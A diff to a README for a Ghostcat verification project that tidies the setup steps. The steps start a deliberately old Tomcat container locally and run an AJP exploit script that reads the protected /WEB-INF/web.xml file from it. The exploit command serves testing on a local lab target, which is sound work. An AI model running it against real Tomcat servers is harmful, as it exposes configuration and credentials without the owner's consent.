@@ -16,8 +16,7 @@ In my case, I wanted to verify which services are exploitable and if so how does
 
 ```bash
 git clone git@github.com:shaunmclernon/ghostcat-verification.git
-cd ghostcat-verification
-cd AJPy
+cd ghostcat-verification/AJPy
 docker run -d -p 8080:8080 -p 8009:8009 tomcat:8.5.32
 python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 127.0.0.1
 ```
